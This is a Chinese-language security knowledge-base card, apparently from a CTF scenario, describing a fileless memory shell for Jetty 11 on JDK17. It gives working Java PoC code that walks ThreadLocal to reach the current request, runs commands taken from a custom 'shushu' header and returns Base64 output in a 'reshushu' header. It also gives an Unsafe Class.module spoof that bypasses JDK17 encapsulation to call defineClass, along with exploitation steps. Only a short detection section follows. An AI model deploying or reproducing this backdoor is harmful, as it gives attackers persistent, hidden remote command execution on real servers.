---
id: web-java-component-jetty11-threadlocal-header-memshell
title: Jetty 11 内存马：遍历 ThreadLocal 取 HttpConnection，请求头执行命令并由响应头回显
type: scenario
domain: web
path: web/java/component
technique: jetty11-threadlocal-header-memshell
tags:
- java
- jetty
- memshell
- jakarta
- threadlocal
- httpconnection
- jdk17
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:43:39+08:00'
  notes: 已对照原文与全部27张图核对：图02确认 jetty 11.0.26/jdk17/spring 5.3.6/aspectjweaver 1.9.22；图07 javax/servlet/Filter ClassNotFound；图10/14/25 确认 threads[9]->threadLocals.table[1].value=HttpConnection->_channel->_request；图15 请求头 shushu:whoami 经 reshushu 头 Base64 回显；图16 注入后 POST /admin 可用。11.0.26 为题目目标环境版本而非原文声明的受影响区间，按 brief 已 --clear affected_versions。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/java/component/web-java-component-jetty11-threadlocal-header-memshell/
draft: false
kb_aliases:
- Jetty 11 内存马
- jakarta.servlet 内存马
- Jetty HttpConnection ThreadLocal
- 请求头命令 响应头回显
- jetty11mem
---

## 一句话结论

Jetty 10/11 改用 `jakarta.servlet` 后，沿用 `javax.servlet.Filter` 的旧内存马会 `ClassNotFoundException`；改为从当前线程的 `ThreadLocal` 链取到 `org.eclipse.jetty.server.HttpConnection`，再经 `_channel._request/_response` 读取自定义请求头执行命令、把 Base64 结果写入自定义响应头，即可做成不注册路由/Filter 的无文件内存马。

## 原理

- Jetty 9 的 Servlet API 包名是 `javax.servlet`，Jetty 10/11 迁移到 `jakarta.servlet`。旧内存马字节码里引用 `javax/servlet/Filter`，在 Jetty 11 中加载时直接 `NoClassDefFoundError: javax/servlet/Filter`。
- Jetty 处理请求的 worker 线程把当前连接保存在 `ThreadLocal` 中：`Thread.currentThread().threadLocals`（`ThreadLocal$ThreadLocalMap`）→ `table` 数组 → `Entry.value`，其中一个是 `org.eclipse.jetty.server.HttpConnection`。
- `HttpConnection` 的 `_channel` 字段为 `org.eclipse.jetty.server.HttpChannelOverHttp`，后者持有 `_request`（`org.eclipse.jetty.server.Request`）与 `_response`。通过反射即可拿到当前请求/响应对象，不需要 `HttpServletRequest` 类型。
- 请求对象提供 `getHeader(String)`，响应对象提供 `setHeader(String, String)`；内存马从一个自定义请求头（如 `shushu`）读取命令，执行后把输出 Base64 编码写入自定义响应头（如 `reshushu`），客户端解码即可，无需页面回显。
- 之所以成立：Jetty 的连接对象在请求处理期间可从线程局部变量到达，且 `Request`/`Response` 的字段和公开方法足以完成“取输入、回写输出”，绕过了对 Servlet API 包名的依赖。
- 注入方式：把内存马类编译成字节码，作为 `TemplatesImpl._bytecodes` 的 translet（静态初始化块/构造方法执行），由反序列化等已有入口触发类加载；JDK17 下反射写 `ClassLoader.defineClass` 等内部成员前需先做 `Class.module` 伪造绕过强封装。

## 触发条件

- 目标为 Jetty 10/11（jakarta.servlet），原文实测 Jetty 11.0.26；
- 攻击者已具备在目标 JVM 内加载字节码的能力（反序列化、表达式注入、TemplatesImpl 等）；
- 运行在 JDK 17 等强封装版本时，需配合 `Unsafe` 篡改 `Class.module` 的模块绕过；
- 请求可到达任意已注册 Servlet（内存马不新增路由，挂在现有请求处理线程上）；
- 未对 `ThreadLocal` 遍历、异常响应头或动态类加载做检测。

## 利用步骤

1. 编译内存马类：在静态初始化块中执行注入逻辑（取 ThreadLocal → HttpConnection → request/response）。
2. 通过已有入口（如 TemplatesImpl）加载该类，触发静态初始化。
3. 访问任意已注册路径（如 `/hello`），带上自定义请求头：`shushu: whoami`。
4. 从响应头 `reshushu` 取出 Base64 结果并解码，确认命令执行。
5. 后续每次请求携带该头即可执行命令，无需重新注入。

## PoC

核心取链与回显逻辑（省略异常处理）：

```java
Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
Object[] table = (Object[]) getFieldValue(threadLocals, "table");
Object request = null, response = null;
for (Object entry : table) {
    if (entry == null) continue;
    Object value = getFieldValue(entry, "value");
    if (value != null && value.getClass().getName()
            .equals("org.eclipse.jetty.server.HttpConnection")) {
        Object channel = getFieldValue(value, "_channel");
        request  = getFieldValue(channel, "_request");
        response = getFieldValue(channel, "_response");
    }
}
String cmd = (String) invokeMethod(request, "getHeader",
        new Class[]{String.class}, new Object[]{"shushu"});
String out = base64(exec(cmd));
invokeMethod(response, "setHeader",
        new Class[]{String.class, String.class}, new Object[]{"reshushu", out});
```

请求/响应示例：

```http
GET /hello HTTP/1.1
Host: target
shushu: whoami
```

```http
HTTP/1.1 200 OK
reshushu: <base64(command output)>
Server: Jetty(11.0.26)
```

JDK17 下加载字节码前的模块绕过（摘要）：

```java
Unsafe unsafe = ...;
long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
unsafe.putObject(memshellClass, offset, Object.class.getModule());
Method defineClass = ClassLoader.class.getDeclaredMethod(
        "defineClass", byte[].class, int.class, int.class);
defineClass.setAccessible(true);
Class<?> c = (Class<?>) defineClass.invoke(
        Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);
c.newInstance();
```

## 变体与关联

- Jetty 9 变体：使用 `javax.servlet` 的 Filter/Servlet 内存马仍可用；升级到 Jetty 10/11 后必须改为 `jakarta.servlet` 或本卡的无 API 方式。
- 取链变体：可遍历所有线程并按 `HttpConnection` 类型定位，而不只依赖当前线程；也可从 `Request` 的 `_channel` 反向取。
- 回显变体：写入响应头、响应体、Cookie 或状态码；命令输入可放 Header、Cookie、URI 参数。
- 注入变体：TemplatesImpl translet、`ClassLoader.defineClass`、Agent、JSP 等；JDK17 下都需先处理模块封装。
- 关联：[[web-java-classloader-jdk17-class-module-field-spoof]]（模块绕过）；[[web-java-deserialization-jdk-eventlistenerlist-tostring]]（JDK17 反序列化触发）；[[web-java-framework-spring-mvc-pathpattern-memshell]]（Spring MVC 内存马对照）。
- 影响边界：注入成功后命令执行权限同 Jetty 进程；内存马随进程存活，重启失效。

## 检测与防御

- 检测：请求中出现固定自定义头（如 `shushu`）且响应出现对应回显头（如 `reshushu`）；线程堆栈/内存中出现对 `ThreadLocal$ThreadLocalMap`、`HttpConnection._channel` 的反射遍历；运行期动态定义类（`ClassLoader.defineClass`）且无对应磁盘 class 文件。
- 修复：升级 Jetty 并修补反序列化/表达式注入入口，阻止任意字节码加载；对 `ObjectInputStream` 使用严格类允许列表。
- 缓解：JDK 17+ 保持强封装并限制 `sun.misc.Unsafe`（`--limit-modules`）；WAF 拦截异常自定义头组合；RASP 监控 `defineClass` 与 ThreadLocal 反射。
